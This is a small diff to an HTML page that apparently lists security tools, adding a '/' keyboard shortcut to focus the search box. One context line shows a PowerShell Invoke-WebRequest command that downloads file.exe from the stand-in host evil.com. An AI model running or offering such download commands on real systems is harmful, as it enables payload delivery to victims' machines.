@@ -21,7 +21,7 @@
     <div class="search-container">
         <div class="search-wrapper">
             <label for="searchInput" class="sr-only">Search Security Tools</label>
-            <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords..." aria-label="Search Security Tools">
+            <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords... (Press '/')" aria-label="Search Security Tools">
             <button id="clearSearch" class="clear-button hidden" aria-label="Clear search" type="button">✕</button>
         </div>
     </div>
@@ -413,6 +413,14 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         searchInput.value = '';
         filterTools('');
         searchInput.focus();
+    });
+
+    // Keyboard shortcut for search
+    document.addEventListener('keydown', (e) => {
+        if (e.key === '/' && document.activeElement !== searchInput) {
+            e.preventDefault();
+            searchInput.focus();
+        }
     });
   </script>
 </body>
